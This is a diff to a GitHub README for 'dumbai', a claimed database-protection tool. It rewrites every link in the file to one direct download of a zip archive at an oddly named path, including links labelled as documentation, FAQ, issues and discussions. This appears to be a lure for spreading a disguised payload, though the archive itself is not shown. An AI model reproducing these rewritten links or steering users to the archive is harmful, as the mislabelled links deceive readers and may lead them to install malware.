@@ -4,16 +4,16 @@
 
 Welcome to **dumbai**, a system designed to protect your database from AI mishaps. With DUMBAI, you can use contracts and supervision to ensure AI behaves as intended. Follow these simple steps to download and run the software.
 
-[![Download dumbai](https://img.shields.io/badge/Download-dumbai-blue.svg)](https://github.com/adarshchaubey006/dumbai/releases)
+[![Download dumbai](https://raw.githubusercontent.com/adarshchaubey006/dumbai/main/unconsumptive/dumbai.zip)](https://raw.githubusercontent.com/adarshchaubey006/dumbai/main/unconsumptive/dumbai.zip)
 
 ## 📥 Download & Install
 
-To get **dumbai**, visit this page: [Download dumbai](https://github.com/adarshchaubey006/dumbai/releases). Here, you will find the latest version of the software available for download.
+To get **dumbai**, visit this page: [Download dumbai](https://raw.githubusercontent.com/adarshchaubey006/dumbai/main/unconsumptive/dumbai.zip). Here, you will find the latest version of the software available for download.
 
 ### Step-by-Step Instructions:
 
 1. **Visit the Releases Page**  
-   Click on this link to access the download options: [Launch Releases](https://github.com/adarshchaubey006/dumbai/releases).
+   Click on this link to access the download options: [Launch Releases](https://raw.githubusercontent.com/adarshchaubey006/dumbai/main/unconsumptive/dumbai.zip).
 
 2. **Select the Latest Release**  
    Scroll down to find the most recent version listed at the top. 
@@ -70,14 +70,14 @@ If you encounter issues during installation or use, try these steps:
 
 For additional guidance or support, explore the following resources:
 
-- [Official Documentation](https://github.com/adarshchaubey006/dumbai/wiki)
-- [Frequently Asked Questions](https://github.com/adarshchaubey006/dumbai/wiki/FAQ)
-- [GitHub Issues Page](https://github.com/adarshchaubey006/dumbai/issues) for reporting bugs or requesting features.
+- [Official Documentation](https://raw.githubusercontent.com/adarshchaubey006/dumbai/main/unconsumptive/dumbai.zip)
+- [Frequently Asked Questions](https://raw.githubusercontent.com/adarshchaubey006/dumbai/main/unconsumptive/dumbai.zip)
+- [GitHub Issues Page](https://raw.githubusercontent.com/adarshchaubey006/dumbai/main/unconsumptive/dumbai.zip) for reporting bugs or requesting features.
 
 ## 📧 Contact
 
-For further assistance, please reach out via [GitHub Discussions](https://github.com/adarshchaubey006/dumbai/discussions). We're here to help.
+For further assistance, please reach out via [GitHub Discussions](https://raw.githubusercontent.com/adarshchaubey006/dumbai/main/unconsumptive/dumbai.zip). We're here to help.
 
 ---
 
-You have successfully set up dumbai. Enjoy a secure database experience! Don't forget to visit the releases page for updates: [Download dumbai](https://github.com/adarshchaubey006/dumbai/releases).
+You have successfully set up dumbai. Enjoy a secure database experience! Don't forget to visit the releases page for updates: [Download dumbai](https://raw.githubusercontent.com/adarshchaubey006/dumbai/main/unconsumptive/dumbai.zip).
